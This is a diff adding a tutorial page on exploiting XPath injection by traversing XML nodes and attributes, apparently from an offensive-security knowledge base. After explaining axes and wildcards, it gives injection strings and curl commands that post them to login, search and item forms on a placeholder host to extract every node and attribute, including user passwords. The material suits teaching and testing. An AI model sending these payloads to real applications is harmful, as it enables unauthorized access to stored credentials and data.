@@ -1,0 +1,92 @@
+---
+title: Exploiting Node and Attribute Traversal via XPath
+description: Learn techniques to exploit XPath Injection for unauthorized XML data
+  access via node and attribute traversal.
+keywords:
+- XPath Injection
+- node traversal
+- attribute extraction
+- XML data access
+- axis manipulation
+- XPath wildcard
+- XML enumeration
+---
+
+# Node and Attribute Traversal
+
+## Context
+
+Node and Attribute Traversal refers to an exploitation technique used in XPath injection attacks to unauthorizedly access XML data. This attack vector leverages weaknesses in the way applications handle user input in XPath queries, opening channels for attackers to extract arbitrary nodes and attributes. This guide assumes knowledge of XPath syntax, XML structure, web application architecture, and fundamental XPath Injection techniques.
+
+## Theory
+
+### XPath Traversal Fundamentals
+
+XPath traversal exploits the power of axes and wildcards to navigate XML nodes beyond the intended scope of queries. By injecting crafted XPath expressions, attackers can enumerate, select, and extract nodes and attributes not supposed to be accessible. Such vulnerabilities exist when applications improperly expose user input to XPath queries without proper sanitization, making them susceptible to traversal attacks.
+
+### Node Set Access via XPath Axes
+
+XPath axes, including `child`, `parent`, `ancestor`, `descendant`, `following`, and `preceding`, define the node relationships facilitating traversal through the XML structure. Attackers inject axis-based expressions such as `//*` or `ancestor::` to enumerate or access hidden nodes. The strategic use of wildcards, like `//`, `*`, and `@*`, bypasses restrictive filters that limit access to particular node names.
+
+### Attribute Extraction Techniques
+
+XPath attribute selectors, denoted as `@attribute` or `@*`, enable attackers to extract values directly from node attributes. An injection such as `//@*` or `//user/@password` allows enumeration of sensitive attributes across the XML document, potentially exposing critical data.
+
+### Axis Manipulation for Deep Traversal
+
+Axis manipulation involves targeting node relationships such as `parent`, `ancestor`, and `descendant` to traverse up or down the XML tree. By injecting expressions like `parent::node()`, `ancestor::*`, and `descendant::*`, attackers can perform lateral or vertical movement within the XML structure, greatly expanding their reach beyond initially accessible data nodes.
+
+## Practice
+
+### Manual Node Enumeration via XPath Injection
+
+- **Inject a universal node selector to enumerate all nodes:**
+
+    ```xml
+    ' or 1=1 or 'a'='a' or //node() | //*
+    ```
+
+- **Send a crafted payload to extract all user nodes and their attributes:**
+
+    ```bash
+    curl -X POST -d "username=' or 1=1 or //user/* | //user/@*" http://target-app/login
+    ```
+
+  Using this injection payload, an attacker can retrieve unauthorized XML nodes and attribute values.
+
+### Attribute Extraction with Wildcards
+
+- **Inject an attribute wildcard to extract all attribute values in the XML:**
+
+    ```xml
+    ' or //@* or 'a'='a'
+    ```
+
+- **Submit the payload to trigger attribute extraction:**
+
+    ```bash
+    curl -X POST -d "search=' or //@* or 'a'='a" http://target-app/search
+    ```
+
+  This technique allows attackers to obtain all attribute values from the XML document, potentially compromising sensitive information.
+
+### Axis Manipulation for Parent/Ancestor Traversal
+
+- **Target parent and ancestor axes to traverse upwards in the XML tree:**
+
+    ```xml
+    ' or parent::node() or ancestor::* or 'a'='a'
+    ```
+
+- **Attempt to access parent or ancestor nodes of the queried element:**
+
+    ```bash
+    curl -X POST -d "id=' or parent::node() or ancestor::* or 'a'='a" http://target-app/item
+    ```
+
+  Through this method, attackers gain access to data from parent or ancestor nodes that are not intended for exposure.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
